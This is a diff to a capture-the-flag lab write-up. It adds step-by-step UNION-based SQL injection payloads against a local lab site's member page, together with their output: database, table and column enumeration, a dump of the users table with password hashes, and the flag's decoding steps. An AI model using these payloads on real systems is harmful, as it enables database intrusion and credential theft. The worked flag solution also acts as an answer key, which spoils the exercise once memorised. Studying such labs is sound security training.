@@ -1,7 +1,7 @@
 go to http://192.168.56.101/index.php?page=member
 
 # get database names
-100 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
+100 UNION ALL SELECT NULL, concat(schema_name) FROM information_schema.schemata
 
 We get :
 - information_schema
@@ -12,4 +12,60 @@ We get :
 - Member_survey
 
 
-Done!
+# get the tables that the user has access to
+0 union SELECT NULL, table_name from information_schema.table_constraints
+
+We get :
+- db_default
+- users
+- guestbook
+- list_images
+- vote_dbs
+
+
+# get all the columns from the tables
+0 union SELECT table_name, column_name FROM information_schema.columns
+
+We get :
+- [...]
+- db_default.id
+- db_default.username
+- db_default.password
+- users.user_id
+- users.first_name
+- users.last_name
+- users.town
+- users.country
+- users.planet
+- users.Commentaire
+- users.countersign
+- guestbook.id_comment
+- guestbook.comment
+- guestbook.name
+- list_images.id
+- list_images.url
+- list_images.title
+- list_images.comment
+- vote_dbs.id_vote
+- vote_dbs.vote
+- vote_dbs.nb_vote
+- vote_dbs.subject
+
+
+user_id, first_name, last_name, town, country, planet, Commentaire, countersign
+
+
+# knowing table's columns, we can now get the data from the 'users' table itself
+0 union SELECT NULL, concat(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
+
+We get :
+- 1Barack HusseinObamaHonolulu AmericaEARTHAmerca !2b3366bcfd44f540e630d4dc2b9b06d9
+- 2AdolfHitlerBerlinAllemagneEarthIch spreche kein Deutsch.60e9032c586fb422e2c16dee6286cf10
+- 3JosephStalineMoscouRussiaEarth????? ????????????? ?????????e083b24a01c483437bcf4a9eea7c1b4d
+- 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
+
+
+# From there, we can see that the comment tells us the process to decrypt the password.
+# We decrypt the password (5ff9d0165b4f92b14994e5c685cdce28) which is "FortyTwo", then lowercase it & finally hash it with sha256
+
+Done !
